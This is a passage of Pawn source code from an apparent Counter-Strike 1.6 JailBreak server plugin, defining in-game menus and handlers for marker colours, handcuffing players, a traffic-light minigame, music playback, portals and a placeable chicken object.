				szPlayerSize[id] = 0 ;
			}	
			case 8: return Show_ChiefMenu_1(id);
			case 9: return PLUGIN_HANDLED;
		}	
	return Show_MarkerMenu(id);	
}

Show_Colorsmenu(id)
{
	new szMenu[512], iKeys = (1<<1|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MARKER_COLOR_MENU");
	if(g_iMarkerColor[id] != 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_COLOR_MARKER_YELLOW");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_YELLOW");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_COLOR_MARKER_RANDOM");
	if(g_iMarkerColor[id] != 3)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_COLOR_MARKER_BLUE");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_BLUE");
	if(g_iMarkerColor[id] != 4)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_COLOR_MARKER_RED");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_RED");
	if(g_iMarkerColor[id] != 5)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_COLOR_MARKER_GREEN");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_GREEN");
	if(g_iMarkerColor[id] != 6)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_COLOR_MARKER_WHITE");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_WHITE");
	if(g_iMarkerColor[id] != 7)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_COLOR_MARKER_PURPLE");
		iKeys |= (1<<6);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_PURPLE");
	if(g_iMarkerColor[id] != 8)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_COLOR_MARKER_ORANGE");
		iKeys |= (1<<7);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_COLOR_MARKER_ORANGE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_Colorsmenu");
}

public Handle_colorsmenu(id, iKey)
{
	switch(iKey)
	{
		case 0:
		{
			g_iMarkerColor[id] = 1;
			color_rm[id] = 255,color_gm[id] = 255,color_bm[id] = 0;
		}	
		case 1:
		{
			g_iMarkerColor[id] = 2;
			color_rm[id] = random_num(50, 254),color_gm[id] = random_num(30, 200),color_bm[id] = random_num(90, 254);
		}
		case 2:
		{
			g_iMarkerColor[id] = 3;
			color_rm[id] = 7,color_gm[id] = 85,color_bm[id] = 255;
		}
		case 3:
		{
			g_iMarkerColor[id] = 4;
			color_rm[id] = 255,color_gm[id] = 3,color_bm[id] = 23;
		}
		case 4:
		{
			g_iMarkerColor[id] = 5;
			color_rm[id] = 0,color_gm[id] = 255,color_bm[id] = 0;
		}
		case 5:
		{
			g_iMarkerColor[id] = 6;
			color_rm[id] = 255,color_gm[id] = 255,color_bm[id] = 255;
		}
		case 6:
		{
			g_iMarkerColor[id] = 7;
			color_rm[id] = 212,color_gm[id] = 0,color_bm[id] = 255;
		}
		case 7:
		{
			g_iMarkerColor[id] = 8;
			color_rm[id] = 102,color_gm[id] = 69,color_bm[id] = 0;
		}
		case 8: return Show_MarkerMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_Colorsmenu(id);
}

Show_CuffMenu_1(id)
{
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_NARUCH_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_NARUCH_ON");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_NARUCH_OFF");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_NARUCH_PLAYERS_NUM");

    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \wНазад");
    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \wВыход");
    return show_menu(id, iKeys, szMenu, -1, "Show_CuffMenu_1");
}

public Handle_CuffMenu_1(id, iKey)
{
    if((g_iDayMode != 1 && g_iDayMode != 2) || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    new NamePlayer[32];
    get_user_name(id, NamePlayer, 31);
    switch(iKey)
    {
        case 0:
        {
            new iTarget, iBody;
            get_user_aiming(id, iTarget, iBody, 60);
            if(IsSetBit(g_iBitUserFree, iTarget))
            {
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_FD_NO");
                return Show_CuffMenu_1(id);
            }
            if(IsSetBit(g_iBitUserWanted, iTarget))
            {
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_WANTED_NO");
                return Show_CuffMenu_1(id);
            }
            if(IsSetBit(g_iBitCuff, iTarget))
            {
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_YES");
                return Show_CuffMenu_1(id);
            }
            if(jbe_is_user_valid(iTarget) && IsSetBit(g_iBitUserAlive, iTarget))
            {
                if(g_iUserTeam[iTarget] != 1) return Show_CuffMenu_1(id);
                
                if(IsSetBit(g_iBitUserBoxing, iTarget))
                {
					UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_NO_BOXING");
                    return Show_CuffMenu_1(id);
                }
                if(IsSetBit(g_iBitUserSoccer, iTarget))
                {
					UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_NO_FOOTBALER");
                    return Show_CuffMenu_1(id);
                }
                new TargetName[32];
                get_user_name(iTarget, TargetName, charsmax(TargetName));
                SetBit(g_iBitCuff, iTarget);
                if(get_user_weapon(iTarget) != CSW_KNIFE) engclient_cmd(iTarget, "weapon_knife");
                else
                {
                    new iActiveItem = get_pdata_cbase(iTarget, m_pActiveItem);
                    if(iActiveItem > 0)
                    {
                        ExecuteHamB(Ham_Item_Deploy, iActiveItem);
                        UTIL_WeaponAnimation(iTarget, 0);
                    }
                }
                jbe_set_cuff_model(iTarget);
                set_pdata_float(iTarget, m_flNextAttack, 999999.0);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_PLAYES_GO", NamePlayer, TargetName);
                emit_sound(iTarget, CHAN_AUTO, "zone54/cuff.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
            }
            else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_PLIZ");
        }
        case 1:
        {
            new iTarget, iBody;
            get_user_aiming(id, iTarget, iBody, 60);
            if(jbe_is_user_valid(iTarget) && IsSetBit(g_iBitUserAlive, iTarget))
            {
                if(g_iUserTeam[iTarget] != 1) return Show_CuffMenu_1(id);
                
                if(IsNotSetBit(g_iBitCuff, iTarget))
                {
					UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_PLAYES_NO");
                    return Show_CuffMenu_1(id);
                }
            
                new TargetName[32];
                get_user_name(iTarget, TargetName, charsmax(TargetName));
                
                ClearBit(g_iBitCuff, iTarget);
                new iActiveItem = get_pdata_cbase(iTarget, m_pActiveItem);
                if(iActiveItem > 0)
                {
                    ExecuteHamB(Ham_Item_Deploy, iActiveItem);
                    UTIL_WeaponAnimation(iTarget, 3);
                }
                set_pdata_float(iTarget, m_flNextAttack, 0.0);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_PLAYES", NamePlayer, TargetName);
                emit_sound(iTarget, CHAN_AUTO, "zone54/uncuff.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
            }
            else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_ALL_CHAT_NARUCH_PLIZ");
        }
        case 2: return Cmd_Show_CuffList(id);
        case 8: return Show_PrezidentMenu_2(id);
        case 9: return PLUGIN_HANDLED;
    }
    return Show_CuffMenu_1(id);
}

Cmd_Show_CuffList(id) return Show_CuffList_1(id, g_iMenuPosition[id] = 0);
Show_CuffList_1(id, iPos)
{
    if(iPos < 0) return PLUGIN_HANDLED;
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsSetBit(g_iBitUserConnected, i) && IsSetBit(g_iBitUserAlive, i) && IsSetBit(g_iBitCuff, i)) g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
        case 0:
        {
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_CuffMenu_1(id);
        }
        default: iLen = formatex(szMenu, charsmax(szMenu), "\wИгроки с наручниками [%d/%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9);
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r-> \w%s^n", szName);
    }
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_CuffList_1");
}

public Handle_CuffList_1(id, iKey)
{
    if((g_iDayMode != 1 && g_iDayMode != 2)) return PLUGIN_HANDLED;
    switch(iKey)
    {
        case 8: return Show_CuffList_1(id, ++g_iMenuPosition[id]);
        case 9: return Show_CuffList_1(id, --g_iMenuPosition[id]);
        default: return PLUGIN_HANDLED;
    }
    return PLUGIN_HANDLED;
}

Show_SvetoforMenu(id)
{
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SVETOFOR_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d%L^n", id, "JBE_MENU_SVETOFOR_INFO");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SVETOFOR_COLOR_RED");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SVETOFOR_COLOR_YELLOW");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SVETOFOR_COLOR_GREEN");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n^n", id, "JBE_MENU_SVETOFOR_COLOR_RANDOM");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d%L^n", id, "JBE_MENU_SVETOFOR_INF");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L %s^n", id, "JBE_MENU_SVETOFOR_CHIEF_COLOR", g_iSvetoforColor[id] ? "\yВкл" : "\rВыкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L %s^n", id, "JBE_MENU_SVETOFOR_SOUND", g_iSvetoforSound ? "\yВкл" : "\rВыкл");
	
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SvetoforMenu");
}

public Handle_SvetoforMenu(id, iKey)
{
	switch(iKey)
	{
		case 0:
		{
			for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
			{
				if(g_iSvetoforSound && IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && (g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer))
				{
					emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				}
				if(IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer && g_iSvetoforColor[iPlayer])
				{
					UTIL_ScreenFade(iPlayer, 1<<10, 1<<10, 0x0000, 255, 0, 0, 75, 1);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_SVETOFOR_RED");
		}
		case 1:
		{
			for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
			{
				if(g_iSvetoforSound && IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && (g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer))
				{
					emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				}
				if(IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer && g_iSvetoforColor[iPlayer])
				{
					UTIL_ScreenFade(iPlayer, 1<<10, 1<<10, 0x0000, 255, 165, 0, 75, 1);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_SVETOFOR_YELLOW");
		}
		case 2:
		{
			for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
			{
				if(g_iSvetoforSound && IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && (g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer))
				{
					emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				}
				if(IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer && g_iSvetoforColor[iPlayer])
				{
					UTIL_ScreenFade(iPlayer, 1<<10, 1<<10, 0x0000, 0, 255, 0, 75, 1);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_SVETOFOR_GREEN");
		}
		case 3:
		{
			for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
			{
				if(g_iSvetoforSound && IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && (g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer))
				{
					emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				}
				if(IsSetBit(g_iBitUserConnected, iPlayer) && IsSetBit(g_iBitUserAlive, iPlayer) && g_iUserTeam[iPlayer] == 1 || g_iChiefId == iPlayer && g_iSvetoforColor[iPlayer])
				{
					UTIL_ScreenFade(iPlayer, 1<<10, 1<<10, 0x0000, random_num(0, 255), random_num(0, 255),random_num(0, 255), 75, 1);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_SVETOFOR_RANDOM");
		}
		case 4:
		{
			if(g_iSvetoforColor[id])
			{
				g_iSvetoforColor[id] = false;
			}
			else
			{
				g_iSvetoforColor[id] = true;
			}
		}
		case 5:
		{
			if(g_iSvetoforSound)
			{
				g_iSvetoforSound = false;
			}
			else
			{
				g_iSvetoforSound = true;
			}
		}
		case 8: return Show_MiniGameMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_SvetoforMenu(id);
}

Cmd_SMusicMenu(id) return Show_SMusicMenu(id, g_iMenuPosition[id] = 0);
Show_SMusicMenu(id, iPos)
{
	if(iPos < 0) return PLUGIN_HANDLED;
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > g_iListMusicSize) iStart = g_iListMusicSize;
	iStart = iStart - (iStart % PLAYERS_PER_PAGE);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > g_iListMusicSize) iEnd = g_iListMusicSize + (iPos ? 1 : 0);
	new szMenu[512], iLen, iPagesNum = (g_iListMusicSize / PLAYERS_PER_PAGE + ((g_iListMusicSize % PLAYERS_PER_PAGE) ? 1 : 0));
	new iKeys = (1<<9), b;
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_SHOP_MUSIC_TITTLE", iPos + 1, iPagesNum);
	for(new a = iStart; a < iEnd; a++)
	{
		new aDataMusic[DATA_MUSIC];
		ArrayGetArray(g_aDataMusicList, a, aDataMusic);
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, aDataMusic[MUSIC_NAME]);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iPos)
	{
		iKeys |= (1<<7);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[8] \w%L", id, "JBE_MENU_BACK");
	} 
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[#] \d%L", id, "JBE_MENU_BACK");
	if(iPagesNum > 1 && iPos + 1 < iPagesNum)
	{
		iKeys |= (1<<8);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_NEXT");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[#] \d%L", id, "JBE_MENU_NEXT");
	
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SMusicMenu");
}

public Handle_SMusicMenu(id, iKey)
{
	switch(iKey)
	{
		case 7: return Show_SMusicMenu(id, --g_iMenuPosition[id]);
		case 8: return Show_SMusicMenu(id, ++g_iMenuPosition[id]);
		case 9: return PLUGIN_HANDLED;
		default:
		{
			new szName[32]; get_user_name(id, szName, charsmax(szName));
			new iTrack = g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey;
			new aDataMusic[DATA_MUSIC];
			ArrayGetArray(g_aDataMusicList, iTrack, aDataMusic);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ALL_CHAT_ONE", szName, aDataMusic[MUSIC_NAME]);
			client_cmd(0, "mp3 play sound/jb_engine/smn_msc/%s.mp3", aDataMusic[FILE_DIR]);
		}
	}
	return Show_SMusicMenu(id, g_iMenuPosition[id]);
}

Show_PortalMenu(id)
{
	if(id != g_iChiefId)
		return PLUGIN_HANDLED;
	
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "Портал^n^n\dПоставить^n");
	if(!g_ObjectPortal[IN])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wПортал^n");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \dПортал^n");
	if(!g_ObjectPortal[OUT])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wКонечная точка^n");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \dКонечная точка^n");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\dУдалить^n");
	if(g_ObjectPortal[IN])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wПортал^n");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \dПортал^n");
	if(g_ObjectPortal[OUT])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wКонечная точка^n");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \dКонечная точка^n");
	if(g_ObjectPortal[IN] || g_ObjectPortal[OUT])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wВсё^n");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \dВсё^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[#] \d%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PortalMenu");
}

public Handle_PortalMenu(id, iKey)
{
	if(id != g_iChiefId)
		return PLUGIN_HANDLED;
	
	switch(iKey)
	{
		case 0: Portal_Create(id, IN);
		case 1: Portal_Create(id, OUT);
		case 2: Portal_Delete(IN);
		case 3: Portal_Delete(OUT);
		case 4: Portal_Delete(IN), Portal_Delete(OUT);
		case 8: return Show_SuperSimonMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_PortalMenu(id);
}

Portal_Create(id, ePortal:iType)
{
	if(pev_valid(g_ObjectPortal[iType]))
		return;
	
	new iEntity = -1; static siPortal;
	if(siPortal || (siPortal = engfunc(EngFunc_AllocString, "info_target"))) 
		iEntity = engfunc(EngFunc_CreateNamedEntity, siPortal);
	
	if(pev_valid(iEntity))
	{
		new Float:vOrigin[3]; fm_get_aiming_position(id, vOrigin);
		vOrigin[2] += 40.0;
		engfunc(EngFunc_SetModel, 	iEntity, 	g_szModelPortal);
		engfunc(EngFunc_SetOrigin, 	iEntity, 	vOrigin);
		
		if(iType == IN)
		{
			set_pev(iEntity, pev_classname,	g_szClassPortal);
			set_pev(iEntity, pev_nextthink, get_gametime());
			set_pev(iEntity, pev_solid, 	SOLID_TRIGGER);
			engfunc(EngFunc_SetSize, iEntity, Float:{-0.4, -37.2, -22.8}, Float:{0.4, 37.8, 22.6});
		}
		else set_pev(iEntity, pev_skin, random_num(6, 7));
		set_pev(iEntity, pev_movetype, MOVETYPE_NONE); 
		g_ObjectPortal[iType] = iEntity;
	}
}

Portal_Delete(ePortal:iType)
{
	new iEntity = g_ObjectPortal[iType];
	g_ObjectPortal[iType] = 0;
	
	if(!pev_valid(iEntity))
		return;
	
	engfunc(EngFunc_RemoveEntity, iEntity);
}

public Portal_PlayerTouch(iEntity, id)
{
	if(!pev_valid(iEntity) || !pev_valid(g_ObjectPortal[OUT]))
		return;
	
	if(pev(iEntity, pev_skin) != 2)
		return;
	
	if(IsNotSetBit(g_iBitUserAlive, id))
		return;
	
	static Float:vOrigin[3];
	pev(g_ObjectPortal[OUT], pev_origin, vOrigin);
	vOrigin[0] += 70.0;
	
	if(is_hull_vacant(vOrigin, (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN))
	{
		set_pev(id, pev_origin, vOrigin);
		new Float:fAngles[3];
		pev(id, pev_angles, fAngles);
		fAngles[1] = 0.0;
		set_pev(id, pev_angles, fAngles);
		set_pev(iEntity, pev_skin, 5);
	}
}

public Portal_Think(iEntity)
{
	if(!pev_valid(iEntity))
		return;

	set_pev(iEntity, pev_nextthink, get_gametime() + 1.0);
	if(!pev_valid(g_ObjectPortal[OUT]))
	{
		set_pev(iEntity, pev_skin, 5);
		return;
	}
	
	new Float:vOriginPortal[3], bool:isPlayer;
	pev(g_ObjectPortal[OUT], pev_origin, vOriginPortal);
	for(new iPlayer = 1, Float:vOrigin[3]; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsNotSetBit(g_iBitUserAlive, iPlayer))
			continue;
		
		pev(iPlayer, pev_origin, vOrigin);
		if(get_distance_f(vOriginPortal, vOrigin) <= 80.0)
		{
			isPlayer = true;
			break;
		}
	}
	set_pev(iEntity, pev_skin, isPlayer ? 5 : 2);
}

Show_ChickenMenu(id)
{
	if(id != g_iChiefId)
		return PLUGIN_HANDLED;
	
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "Курочка^n^n");
	if(!g_ObjectChicken)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wПоставить^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \dУдалить^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \dПрокрутить^n");
		iKeys |= (1<<0);
	}
	else 
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \dПоставить^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wУдалить^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wПрокрутить^n");
		iKeys |= (1<<1|1<<2);
	}	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[#] \d%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ChickenMenu");
}

public Handle_ChickenMenu(id, iKey)
{
	if(id != g_iChiefId)
		return PLUGIN_HANDLED;
	
	switch(iKey)
	{
		case 0: Chicken_Create(id);
		case 1: Chicken_Delete();
		case 2: if(g_ObjectChicken && !pev(g_ObjectChicken, pev_iuser1)) Chicken_Rotate(random_num(1, 2));	
		case 8: return Show_MiniGameMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_ChickenMenu(id);
}

Chicken_Create(id)
{
	if(pev_valid(g_ObjectChicken))
		return;
	
	new iEntity = -1; static siChicken;
	if(siChicken || (siChicken = engfunc(EngFunc_AllocString, "info_target"))) 
	iEntity = engfunc(EngFunc_CreateNamedEntity, siChicken);
	
	if(pev_valid(iEntity))
	{
		new Float:vOrigin[3]; fm_get_aiming_position(id, vOrigin);

		set_pev(iEntity, pev_classname,	g_szClassChicken);
		set_pev(iEntity, pev_solid, 	SOLID_BBOX);
		set_pev(iEntity, pev_movetype, 	MOVETYPE_NONE);
		set_pev(iEntity, pev_sequence, 	0);
		set_pev(iEntity, pev_framerate, 1.0);
		set_pev(iEntity, pev_nextthink, get_gametime() + 1.0);
		
		vOrigin[2] += 37.0;
		engfunc(EngFunc_SetModel, 	iEntity, 	g_szModelChicken);
		engfunc(EngFunc_SetOrigin, 	iEntity, 	vOrigin);
		engfunc(EngFunc_SetSize, 	iEntity,	Float:{-6.0, 1.0, -14.0}, Float:{5.5, 23.5, 10.0});
		
		g_ObjectChicken = iEntity;
